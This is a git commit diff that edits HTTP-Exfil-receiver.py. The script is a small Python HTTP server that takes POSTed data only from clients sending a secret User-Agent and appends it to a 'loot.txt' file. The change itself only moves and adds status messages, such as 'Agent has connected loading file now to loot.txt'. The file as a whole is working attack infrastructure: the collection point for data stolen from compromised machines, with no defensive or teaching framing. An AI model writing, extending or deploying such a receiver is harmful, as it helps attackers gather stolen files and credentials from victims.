0109025a8ab771b130da4863dfb9f43ab27c5910
Plague <89159011+Plague-0x7F@users.noreply.github.com>
2024-05-17 14:39:02 -0400

    update

--- HTTP-Exfil-receiver.py
+++ HTTP-Exfil-receiver.py
@@ -10,13 +10,15 @@ PORT = 8080
 class MyRequestHandler(http.server.SimpleHTTPRequestHandler):
     def do_POST(self):
         if 'User-Agent' in self.headers and self.headers['User-Agent'] == 'you_secret_value':
+            print(self.headers)
             with open('loot.txt', 'a') as f:
                 f.write(self.rfile.read().decode('utf-8') + '\n')
-                print(self.headers)
+                print("Agent has connected loading file now to loot.txt")
         else:
             self.send_response(403)
             self.end_headers()
             print(self.headers)
+            print(" \nFailed Connection \n")
 
 with socketserver.TCPServer(("", PORT), MyRequestHandler) as httpd:
     print("serving at port", PORT)
